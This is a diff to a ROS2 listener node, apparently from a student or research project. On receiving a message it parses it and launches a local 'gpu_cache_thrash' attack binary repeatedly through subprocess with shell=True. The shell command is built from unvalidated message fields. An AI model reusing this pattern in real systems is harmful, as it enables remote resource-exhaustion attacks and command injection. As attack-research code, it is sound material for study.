@@ -26,18 +26,8 @@ import sys #modified
 
 class Listener(Node):
 
-    def __init__(self, attack):
+    def __init__(self):
         super().__init__('listener')
-        #Below is modification
-        self.attack_param = None
-        if attack == 'pin':
-            self.attack_param = 'pin 90 1300'
-        elif attack == 'scan':
-            self.attack_param = 'scan 90 256'
-        else:
-            print('ERROR: attack parameter can only be \'pin\' or \'scan\'\n')
-            quit()
-        #end of modification
 
         self.sub = self.create_subscription(String, 'chatter', self.chatter_callback, 10) #modified
 
@@ -45,12 +35,28 @@ class Listener(Node):
         #Message To Confirm Attack Packet was recieved below:
         self.get_logger().info('I heard: [%s], Executing Attack' % msg.data) #modified
 
+        #Analyzing Message Packet
+        msg_list = (msg.data).split()
+
+        if(msg_list[2] == 'pin'):
+            attack_param = msg_list[2]
+            third_param = 1300
+        elif(msg_list[2] == 'scan'):
+            attack_param = msg_list[2]
+            third_param = 256
+
+        duration_param = msg_list[3]
+        iteration_param = int(msg_list[4]) 
+
+        full_attack_param = f'{attack_param} {duration_param} {third_param}'
+
         #Attack execution bellow:
-        attack_cmd = 'cd ~/Documents/week7/bella && ./gpu_cache_thrash ' + self.attack_param
-        subprocess.Popen(attack_cmd, shell=True)
+        attack_cmd = 'cd ~/Documents/week7/bella && ./gpu_cache_thrash ' + full_attack_param
+        for iter in range(iteration_param):
+            subprocess.Popen(attack_cmd, shell=True)
 
         #Message To Confirm Attack executed below:
-        self.get_logger().info('Executed the attack, killing node...\n')
+        self.get_logger().info(f'Executed the {attack_param} attack {iteration_param} times for {duration_param}s, killing node...\n')
         quit() #stopping program altogether
 
         #below was previous thought process, will delete if not needed
@@ -64,9 +70,7 @@ class Listener(Node):
 def main(args=None):
     rclpy.init(args=args)
 
-    node = Listener(attack=sys.argv[1]) #modified
-    #above needs to be tested as ros2 convention is ros2 run nodePackageThing nodeFile
-    #i am unsure if an aditional argument will properly pass
+    node = Listener()
 
     try:
         rclpy.spin(node)
